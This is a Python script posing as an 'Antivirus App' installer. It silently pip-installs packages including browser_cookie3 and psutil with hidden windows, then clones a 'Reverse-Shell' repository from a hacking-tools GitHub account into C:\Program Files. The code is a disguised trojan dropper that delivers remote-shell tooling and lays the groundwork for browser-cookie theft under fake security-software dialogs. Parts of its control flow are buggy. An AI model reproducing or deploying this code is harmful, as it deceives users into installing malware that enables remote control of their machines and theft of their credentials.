from importlib import import_module
import subprocess,sys,os
from threading import Thread

class Dependencies_Installer:
    def __init__(self):
        self.deps = ["tk","urllib3","socket","os","shutil","platform","psutil","stat","sys","browser_cookie3"]

    def start(self):
        if self.internet_con() == True:
            self.install_dependencies()
            Thread(target=self.updateapp(),daemon=True).start()

    def install_dependencies(self):
        from tkinter import messagebox
        messagebox.showinfo(title='Antivirus App(Installer)',message='Dependencies installing... please be patient, So click ok to continue')
        for installing in self.deps:
            try:
                import_module(installing)
            except ModuleNotFoundError:
                subprocess.check_call(['pip','install',installing],creationflags=subprocess.CREATE_NO_WINDOW)
        messagebox.showinfo(title='Antivirus App(Installer)',message='Dependecies installed successfully')
        sys.exit(1)

    def updateapp(self):
        target_dir = 'C:\\Program Files'
        os.chdir(target_dir)
        subprocess.check_call(['git','clone','https://github.com/H-ckingTools/Reverse-Shell.git'])

    def internet_con(self):
        import urllib3
        from tkinter import messagebox
        make_req = urllib3.PoolManager()
        try:
            make_req.request('GET','www.google.com')
            return True
        except Exception:
            messagebox.showerror(title='Antivirus App',message='Turn on your internet')

